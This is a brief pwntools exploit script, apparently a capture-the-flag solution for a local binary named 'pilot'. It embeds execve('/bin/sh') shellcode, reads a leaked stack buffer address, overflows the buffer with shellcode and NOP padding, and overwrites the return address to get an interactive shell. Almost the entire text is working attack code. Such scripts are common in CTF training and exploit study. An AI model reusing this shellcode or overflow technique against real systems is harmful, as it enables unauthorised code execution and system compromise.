#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from pprint import pprint
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

shellcode =  "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
print len(shellcode)
print disasm(shellcode)


io = process("./pilot")

io.recvuntil("[*]Location:")
buf_addr = int(io.recvuntil("\n"), 16)

payload = shellcode + "\x90" * (0x20 + 0x8 - len(shellcode))  + p64(buf_addr)

raw_input("DEBUG: ")
gdb.attach(io, "b *0x400B35")
io.sendlineafter("[*]Command:", payload)
io.interactive()
io.close()
